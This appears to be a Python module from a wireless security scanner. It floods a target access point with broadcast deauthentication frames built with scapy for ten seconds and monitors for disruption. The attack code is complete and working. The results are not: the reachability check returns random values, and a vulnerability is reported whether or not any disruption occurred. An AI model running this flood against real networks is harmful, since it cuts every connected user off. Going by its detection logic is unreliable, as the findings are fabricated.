# scanners/dos_scanner.py

import time
from random import random
from threading import Thread, Event
from typing import Dict, Any, Optional

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

from scanners.base_scanner import BaseScanner


class DosScanner(BaseScanner):
    def __init__(
        self,
        core_framework,
        vulnerability_db: Dict[str, Any],
        gui_update_callback: Optional[Any] = None
    ):
        """
        Initialize the DosScanner with CoreFramework, vulnerability database, and GUI callback.

        Args:
            core_framework (CoreFramework): An instance of CoreFramework.
            vulnerability_db (Dict[str, Any]): The vulnerability database.
            gui_update_callback (Optional[Any], optional): Callback function to update the GUI. Defaults to None.
        """
        super().__init__(core_framework, vulnerability_db)
        self.detected_vulnerabilities = []
        self.gui_update_callback = gui_update_callback  # Callback to update GUI
        self.stop_monitoring_event = Event()
        self.logger = self.core_framework.logger.getChild(self.__class__.__name__)
        self.logger.info("DosScanner initialized.")

    def scan(self, target: Dict[str, Any]):
        """
        Scans the target network for Denial-of-Service vulnerabilities by sending deauthentication frames.

        Args:
            target (Dict[str, Any]): Information about the target device.
        """
        self.logger.info(f"Starting DoS Scan on target: {target}")

        bssid = target.get('bssid')
        if not bssid:
            self.logger.error("Target BSSID not specified.")
            self.update_feedback("Target BSSID not specified for DoS scan.")
            return

        # Start monitoring the network stability in a separate thread
        monitor_thread = Thread(target=self.monitor_network_stability, args=(bssid,), daemon=True)
        monitor_thread.start()

        # Start DoS attack: flood deauthentication frames
        self.logger.info(f"Sending deauthentication frames to BSSID: {bssid} to test DoS vulnerability.")
        deauth_pkt = RadioTap() / Dot11(
            addr1='FF:FF:FF:FF:FF:FF',
            addr2=self.core_framework.network_manager.get_interface_mac(),
            addr3=bssid
        ) / Dot11Deauth(reason=7)

        attack_duration = 10  # seconds

        # Start sending packets in a separate thread to avoid blocking
        attack_thread = Thread(
            target=self.core_framework.send_continuous_packets,
            args=(deauth_pkt, 0.05),
            daemon=True
        )
        attack_thread.start()

        self.logger.info(f"Running DoS attack for {attack_duration} seconds...")
        self.update_feedback(f"DoS attack initiated on BSSID {bssid}.")

        time.sleep(attack_duration)

        # Stop the attack and monitoring
        self.core_framework.stop_continuous_packets()
        self.stop_monitoring_event.set()  # Signal the monitoring thread to stop
        monitor_thread.join()

        # Evaluate results and check if vulnerability was detected
        if 'DOS_VULNERABILITY' in self.vulnerability_db:
            vulnerability = {
                'type': 'Denial-of-Service',
                'description': 'The network is susceptible to DoS attacks via deauthentication frame flooding.',
                'bssid': bssid,
                'action': 'Implement measures to mitigate DoS attacks, such as client-side protections.'
            }
            self.detected_vulnerabilities.append(vulnerability)
            self.logger.warning(f"Denial-of-Service Vulnerability Detected: {vulnerability}")
            # Optional: Update GUI to show detected vulnerability
            if self.gui_update_callback:
                self.gui_update_callback(f"DoS Vulnerability Detected on BSSID: {bssid}")

    def monitor_network_stability(self, bssid: str):
        """
        Monitors network stability during the DoS attack to detect disruptions.
        Sends feedback to GUI and logs potential vulnerabilities.

        Args:
            bssid (str): The BSSID of the target device.
        """
        self.logger.info(f"Monitoring network stability for BSSID: {bssid}...")
        while not self.stop_monitoring_event.is_set():
            # Check if target is reachable (e.g., simulate ping or connectivity check)
            target_reachable = self.is_target_reachable(bssid)

            if target_reachable:
                status = f"Target BSSID {bssid} is stable."
            else:
                status = f"Disruption detected on BSSID {bssid} (possible DoS)."
                self.logger.warning(status)

            # Update GUI with real-time feedback
            if self.gui_update_callback:
                self.gui_update_callback(status)

            time.sleep(1)  # Adjust interval for monitoring frequency

    def is_target_reachable(self, bssid: str) -> bool:
        """
        Placeholder for checking if target is reachable (connectivity check).
        In a real implementation, this might involve ARP requests or ping-like tests.

        Args:
            bssid (str): The BSSID of the target device.

        Returns:
            bool: True if reachable, False otherwise.
        """
        # Replace with actual connectivity check logic
        # For demonstration, we'll simulate random connectivity status
        return random() > 0.5

    def update_feedback(self, message: str):
        """
        Updates the GUI with feedback messages.

        Args:
            message (str): The message to display.
        """
        if self.gui_update_callback:
            self.gui_update_callback(message)
